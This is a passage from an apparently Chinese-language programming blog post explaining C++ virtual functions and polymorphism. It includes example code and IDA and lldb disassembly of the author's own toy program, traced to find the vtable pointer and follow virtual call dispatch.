class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  Base Class have one function.</span></span><br><span class="line"><span class="comment"> *  [virtual function]say(): using iostream to output a message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm base."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Son Class inherits from Base Class.</span></span><br><span class="line"><span class="comment"> * say(): this function re-defined(Overriden) BaseClass::say().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SonClass</span>:</span> <span class="keyword">public</span> BaseClass</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm Son."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">letClassSaySomething</span><span class="params">(BaseClass* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p-&gt;say();</span><br><span class="line">    <span class="keyword">delete</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//The argument is a pointer to a SonClass (derived class).</span></span><br><span class="line">    letClassSaySomething(<span class="keyword">new</span> SonClass());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个简单的例子的结果是：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&apos;m Son.</span><br></pre></td></tr></table></figure><p>但是如果将BaseClass中的virtual void say()去掉virtual这个关键字，<br>那么效果可能完全不一样;  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&apos;m base.</span><br></pre></td></tr></table></figure><p>原因是因为在BaseClass中已经定义好了BaseClass::say()，<br>子类继承父类之后对于原有的成员方法无法实现重写(无法发挥多态);<br>所以在实例化为对象之后调用的依旧是父类中的方法;<br>但是在父类的方法定义前加入virtual关键字表示该方法为一个虚函数，任何类只要继承该类即可对该方法进行重写以达到函数的多态特点;  </p><h3 id="Polymorphism"><a href="#Polymorphism" class="headerlink" title="Polymorphism"></a>Polymorphism</h3><p>实际上多态性的体现至少还有Abstract base classes，<br>但是这目前用不到所以也不必细看（实际上简单看一下就懂了</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>写完这边博客之后睡下了总想知道程序内部的结构和其如何调用到子类里面的方法;<br>这让我一晚上都没有睡好，C++实际上都没有进行过简单的逆向和分析，这也正合我意;<br>我的目标是：<br>1.在子类中重写的虚函数，是怎么被调用的;<br>2.找到虚表的位置，分析虚表;<br>所以我修改了源代码，让一个子类进行多继承<br>//Remark：由于逆向很菜，所以这里重复修改了很多次;<br>//感谢我大哥processor和40kO的帮助下学到了很多技巧;<br>Source Code：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">talk</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm FClass::talk()."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm BaseClass::say()."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SonClass</span>:</span> <span class="keyword">public</span> BaseClass,<span class="keyword">public</span> FClass</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm SonClass::say()."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">talk</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm SonClass::talk()."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">letClassSaySomething</span><span class="params">(SonClass* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p-&gt;say();</span><br><span class="line">    p-&gt;talk();</span><br><span class="line">    <span class="keyword">delete</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SonClass* scp = <span class="keyword">new</span> SonClass();</span><br><span class="line">    letClassSaySomething(scp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,scp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用IDA去简单的进行分析一个虚函数的调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">__xt:0000000100000F40 ; Attributes: bp-based frame</span><br><span class="line">text:0000000100000F40</span><br><span class="line">text:0000000100000F40 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">text:0000000100000F40                 public _main</span><br><span class="line">text:0000000100000F40 _main           proc near</span><br><span class="line">text:0000000100000F40</span><br><span class="line">text:0000000100000F40 var_24          = dword ptr -24h</span><br><span class="line">text:0000000100000F40 var_20          = qword ptr -20h</span><br><span class="line">text:0000000100000F40 var_18          = qword ptr -18h</span><br><span class="line">text:0000000100000F40 var_10          = qword ptr -10h</span><br><span class="line">text:0000000100000F40 var_8           = dword ptr -8</span><br><span class="line">text:0000000100000F40 var_4           = dword ptr -4</span><br><span class="line">text:0000000100000F40</span><br><span class="line">text:0000000100000F40        push    rbp</span><br><span class="line">text:0000000100000F41        mov     rbp, rsp</span><br><span class="line">text:0000000100000F44        sub     rsp, 30h</span><br><span class="line">text:0000000100000F48        mov     [rbp+var_4], 0</span><br><span class="line">text:0000000100000F4F        mov     [rbp+var_8], edi</span><br><span class="line">text:0000000100000F52        mov     [rbp+var_10], rsi</span><br><span class="line">text:0000000100000F56        mov     edi, 10h        ; unsigned __int64</span><br><span class="line">text:0000000100000F5B        call    __Znwm          ; operator new(ulong)</span><br><span class="line">;这里是对于对象进行new的时候，返回值应该是指向这个对象的指针(姑且称之为：对象指针)</span><br><span class="line">text:0000000100000F60        xor     esi, esi        ; int</span><br><span class="line">text:0000000100000F62        mov     rdi, rax        ; void *</span><br><span class="line">text:0000000100000F65        mov     edx, 10h        ; size_t</span><br><span class="line">text:0000000100000F6A        mov     [rbp+var_20], rax</span><br><span class="line">;对象指针被转移到当年函数所在的栈中[rbp+var_20]的位置储存</span><br><span class="line">text:0000000100000F6E        call    _memset</span><br><span class="line">;由于我们的对象是new出来的，所以应该有一个清空该块内存的操作</span><br><span class="line">;然而这里的_memset是fastcall，所以我观察三个寄存器</span><br><span class="line">;rdi：对象指针</span><br><span class="line">;rsi：0</span><br><span class="line">;rdx：0x10</span><br><span class="line">;但是这里又引发了一个问题：现在的对象指针中都被清零了，而对象也new好了，那么虚表指针等储存在对象指针中的内容是多久被装载进去的呢？</span><br><span class="line">text:0000000100000F73        mov     rdi, [rbp+var_20] ; this</span><br><span class="line">;从栈中[rbp+var_20]的位置将储存的对象指针放到rdi中进行参数传值</span><br><span class="line">text:0000000100000F77        call    __ZN8SonClassC1Ev ; SonClass::SonClass(void)</span><br><span class="line">;这里是该类的默认构造函数，对象由类实例化而来</span><br><span class="line">;虽然我没有写构造函数，应该是编译器为我加上的，但是我认为应该关心一下这个函数的返回值(rax)</span><br><span class="line">text:0000000100000F7C        mov     rax, [rbp+var_20]</span><br><span class="line">;看到这里又有问题了，并没有将上一个函数的返回值(rax)储存，而是选择了直接覆盖</span><br><span class="line">;这里我很迷，在40kO和processor的指导下我理解了这种情况：可能压根上面这个call就没有返回值，谈什么储存</span><br><span class="line">text:0000000100000F80        mov     [rbp+var_18], rax</span><br><span class="line">text:0000000100000F84        mov     rdi, [rbp+var_18]</span><br><span class="line">;注意这里的传参，其实rdi中储存的就是对象指针</span><br><span class="line">text:0000000100000F88        call    __Z20letClassSaySomethingP8SonClass ; letClassSaySomething(SonClass *)</span><br><span class="line">;所以我们要跟进这个call去进行分析</span><br><span class="line">text:0000000100000F8D        mov     rsi, [rbp+var_18]</span><br><span class="line">text:0000000100000F91        lea     rdi, aP         ; &quot;%p\n&quot;</span><br><span class="line">text:0000000100000F98        mov     al, 0</span><br><span class="line">text:0000000100000F9A        call    _printf</span><br><span class="line">text:0000000100000F9F        xor     ecx, ecx</span><br><span class="line">text:0000000100000FA1        mov     [rbp+var_24], eax</span><br><span class="line">text:0000000100000FA4        mov     eax, ecx</span><br><span class="line">text:0000000100000FA6        add     rsp, 30h</span><br><span class="line">text:0000000100000FAA        pop     rbp</span><br><span class="line">text:0000000100000FAB        retn</span><br><span class="line">text:0000000100000FAB _main  endp</span><br><span class="line">text:0000000100000FAB</span><br></pre></td></tr></table></figure><p>跟进call</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">text:0000000100000EF0 ; Attributes: bp-based frame</span><br><span class="line">text:0000000100000EF0</span><br><span class="line">text:0000000100000EF0 ; letClassSaySomething(SonClass *)</span><br><span class="line">text:0000000100000EF0                 public __Z20letClassSaySomethingP8SonClass</span><br><span class="line">text:0000000100000EF0 __Z20letClassSaySomethingP8SonClass proc near</span><br><span class="line">text:0000000100000EF0                                         ; CODE XREF: _main+48↓p</span><br><span class="line">text:0000000100000EF0</span><br><span class="line">text:0000000100000EF0 var_18          = qword ptr -18h</span><br><span class="line">text:0000000100000EF0 var_10          = qword ptr -10h</span><br><span class="line">text:0000000100000EF0 var_8           = qword ptr -8</span><br><span class="line">text:0000000100000EF0</span><br><span class="line">text:0000000100000EF0        push    rbp</span><br><span class="line">text:0000000100000EF1        mov     rbp, rsp</span><br><span class="line">text:0000000100000EF4        sub     rsp, 20h</span><br><span class="line">text:0000000100000EF8        mov     [rbp+var_8], rdi</span><br><span class="line">;传入的参数是对象指针，将其放入该函数栈中[rbp+var_8]中储存</span><br><span class="line">text:0000000100000EFC        mov     rdi, [rbp+var_8]</span><br><span class="line">text:0000000100000F00        mov     rax, [rdi]</span><br><span class="line">;将对象指针所指向的地址中的值放入rax中</span><br><span class="line">;那么放入rax的这个值到底是什么？</span><br><span class="line">text:0000000100000F03        call    qword ptr [rax]</span><br><span class="line">;这个我能猜到rax中应该是一个指针，因为进行了访存</span><br><span class="line">;rax中应该存放的是虚表指针，为什么呢？</span><br><span class="line">;对象指针中开头应该存放了虚表指针</span><br><span class="line">;那虚表指针中又存放了一堆指针，这些指针指向实际的虚函数代码</span><br><span class="line">;以上都是我大哥processor和40kO教我的，由于我几乎不会逆向，所以我懵逼了，所以我选择进行调试</span><br><span class="line">text:0000000100000F05        mov     rax, [rbp+var_8]</span><br><span class="line">text:0000000100000F09        mov     rdi, [rax]</span><br><span class="line">text:0000000100000F0C        mov     [rbp+var_10], rdi</span><br><span class="line">text:0000000100000F10        mov     rdi, rax</span><br><span class="line">text:0000000100000F13        mov     rax, [rbp+var_10]</span><br><span class="line">text:0000000100000F17        call    qword ptr [rax+8]</span><br><span class="line">text:0000000100000F1A        mov     rax, [rbp+var_8]</span><br><span class="line">text:0000000100000F1E        cmp     rax, 0</span><br><span class="line">text:0000000100000F22        mov     [rbp+var_18], rax</span><br><span class="line">text:0000000100000F26        jz      loc_100000F38</span><br><span class="line">text:0000000100000F2C        mov     rax, [rbp+var_18]</span><br><span class="line">text:0000000100000F30        mov     rdi, rax        ; void *</span><br><span class="line">text:0000000100000F33        call    __ZdlPv         ; operator delete(void *)</span><br><span class="line">text:0000000100000F38</span><br><span class="line">text:0000000100000F38 loc_100000F38:                          ; CODE XREF: letClassSaySomething(SonClass *)+36↑j</span><br><span class="line">text:0000000100000F38        add     rsp, 20h</span><br><span class="line">text:0000000100000F3C        pop     rbp</span><br><span class="line">text:0000000100000F3D        retn</span><br><span class="line">text:0000000100000F3D __Z20letClassSaySomethingP8SonClass endp</span><br></pre></td></tr></table></figure><h3 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h3><p>首先明确调试的目标：<br>1.注意new之后的返回值<br>2.注意构造函数之后的rax<br>3.观察对象指针中的变化<br>4.画出对象指针、虚表指针中的布局，然后搞清楚他们之间的关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">main @ virtual_function:</span><br><span class="line">    0x10f14cf40: push   rbp</span><br><span class="line">    0x10f14cf41: mov    rbp, rsp</span><br><span class="line">    0x10f14cf44: sub    rsp, 0x30</span><br><span class="line">    0x10f14cf48: mov    dword ptr [rbp - 0x4], 0x0</span><br><span class="line">    0x10f14cf4f: mov    dword ptr [rbp - 0x8], edi</span><br><span class="line">    0x10f14cf52: mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf56: mov    edi, 0x10</span><br><span class="line">    0x10f14cf5b: call   0x10f14dd8e               ; symbol stub for: operator new(unsigned long)</span><br><span class="line">    0x10f14cf60: xor    esi, esi</span><br><span class="line">    0x10f14cf62: mov    rdi, rax</span><br><span class="line">    0x10f14cf65: mov    edx, 0x10</span><br><span class="line">    0x10f14cf6a: mov    qword ptr [rbp - 0x20], rax</span><br><span class="line">    0x10f14cf6e: call   0x10f14dda0               ; symbol stub for: memset</span><br><span class="line">    0x10f14cf73: mov    rdi, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf77: call   0x10f14cfb0               ; SonClass::SonClass at main.cpp:24</span><br><span class="line">    0x10f14cf7c: mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf80: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf84: mov    rdi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf88: call   0x10f14cef0               ; letClassSaySomething at main.cpp:38</span><br><span class="line">    0x10f14cf8d: mov    rsi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf91: lea    rdi, [rip + 0xf4c]        ; "%p\n"</span><br><span class="line">    0x10f14cf98: mov    al, 0x0</span><br><span class="line">    0x10f14cf9a: call   0x10f14dda6               ; symbol stub for: printf</span><br><span class="line">    0x10f14cf9f: xor    ecx, ecx</span><br><span class="line">    0x10f14cfa1: mov    dword ptr [rbp - 0x24], eax</span><br><span class="line">    0x10f14cfa4: mov    eax, ecx</span><br><span class="line">    0x10f14cfa6: add    rsp, 0x30</span><br><span class="line">    0x10f14cfaa: pop    rbp</span><br><span class="line">    0x10f14cfab: ret    </span><br><span class="line">    0x10f14cfac: nop    dword ptr [rax]</span><br></pre></td></tr></table></figure><p>程序断在了new之前，跟进到call之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">main @ virtual_function:</span><br><span class="line">    0x10f14cf40: push   rbp</span><br><span class="line">    0x10f14cf41: mov    rbp, rsp</span><br><span class="line">    0x10f14cf44: sub    rsp, 0x30</span><br><span class="line">    0x10f14cf48: mov    dword ptr [rbp - 0x4], 0x0</span><br><span class="line">    0x10f14cf4f: mov    dword ptr [rbp - 0x8], edi</span><br><span class="line">    0x10f14cf52: mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line">    0x10f14cf56: mov    edi, 0x10</span><br><span class="line">    0x10f14cf5b: call   0x10f14dd8e               ; symbol stub for: operator new(unsigned long)</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf60: xor    esi, esi</span><br><span class="line">    0x10f14cf62: mov    rdi, rax</span><br><span class="line">    0x10f14cf65: mov    edx, 0x10</span><br><span class="line">    0x10f14cf6a: mov    qword ptr [rbp - 0x20], rax</span><br><span class="line">    0x10f14cf6e: call   0x10f14dda0               ; symbol stub for: memset</span><br><span class="line">    0x10f14cf73: mov    rdi, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf77: call   0x10f14cfb0               ; SonClass::SonClass at main.cpp:24</span><br><span class="line">    0x10f14cf7c: mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf80: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf84: mov    rdi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf88: call   0x10f14cef0               ; letClassSaySomething at main.cpp:38</span><br><span class="line">    0x10f14cf8d: mov    rsi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf91: lea    rdi, [rip + 0xf4c]        ; "%p\n"</span><br><span class="line">    0x10f14cf98: mov    al, 0x0</span><br><span class="line">    0x10f14cf9a: call   0x10f14dda6               ; symbol stub for: printf</span><br><span class="line">    0x10f14cf9f: xor    ecx, ecx</span><br><span class="line">    0x10f14cfa1: mov    dword ptr [rbp - 0x24], eax</span><br><span class="line">    0x10f14cfa4: mov    eax, ecx</span><br><span class="line">    0x10f14cfa6: add    rsp, 0x30</span><br><span class="line">    0x10f14cfaa: pop    rbp</span><br><span class="line">    0x10f14cfab: ret    </span><br><span class="line">    0x10f14cfac: nop    dword ptr [rax]</span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x00007ffc32402e20</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x0000000000000000</span><br><span class="line">       rdx = 0x000000000000002e</span><br><span class="line">       rdi = 0x0000000000000004</span><br><span class="line">       rsi = 0x0000000000000008</span><br><span class="line">       rbp = 0x00007ffee0ab3720</span><br><span class="line">       rsp = 0x00007ffee0ab36f0</span><br><span class="line">        r8 = 0x000000000000000f</span><br><span class="line">        r9 = 0x00007ffc32400360</span><br><span class="line">       r10 = 0x0000000000000000</span><br><span class="line">       r11 = 0x0000000000000000</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf60  virtual_function`main + 32 at main.cpp:46</span><br><span class="line">    rflags = 0x0000000000000206</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>返回值为：0x00007ffc32402e20<br>我认为这个值就是对象指针，但是由于后面还进行了memset()<br>所以跟到构造函数前观察对象指针中的情况  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">main @ virtual_function:</span><br><span class="line">    0x10f14cf40: push   rbp</span><br><span class="line">    0x10f14cf41: mov    rbp, rsp</span><br><span class="line">    0x10f14cf44: sub    rsp, 0x30</span><br><span class="line">    0x10f14cf48: mov    dword ptr [rbp - 0x4], 0x0</span><br><span class="line">    0x10f14cf4f: mov    dword ptr [rbp - 0x8], edi</span><br><span class="line">    0x10f14cf52: mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line">    0x10f14cf56: mov    edi, 0x10</span><br><span class="line">    0x10f14cf5b: call   0x10f14dd8e               ; symbol stub for: operator new(unsigned long)</span><br><span class="line">    0x10f14cf60: xor    esi, esi</span><br><span class="line">    0x10f14cf62: mov    rdi, rax</span><br><span class="line">    0x10f14cf65: mov    edx, 0x10</span><br><span class="line">    0x10f14cf6a: mov    qword ptr [rbp - 0x20], rax</span><br><span class="line">    0x10f14cf6e: call   0x10f14dda0               ; symbol stub for: memset</span><br><span class="line">    0x10f14cf73: mov    rdi, qword ptr [rbp - 0x20]</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf77: call   0x10f14cfb0               ; SonClass::SonClass at main.cpp:24</span><br><span class="line">    0x10f14cf7c: mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf80: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf84: mov    rdi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf88: call   0x10f14cef0               ; letClassSaySomething at main.cpp:38</span><br><span class="line">    0x10f14cf8d: mov    rsi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf91: lea    rdi, [rip + 0xf4c]        ; "%p\n"</span><br><span class="line">    0x10f14cf98: mov    al, 0x0</span><br><span class="line">    0x10f14cf9a: call   0x10f14dda6               ; symbol stub for: printf</span><br><span class="line">    0x10f14cf9f: xor    ecx, ecx</span><br><span class="line">    0x10f14cfa1: mov    dword ptr [rbp - 0x24], eax</span><br><span class="line">    0x10f14cfa4: mov    eax, ecx</span><br><span class="line">    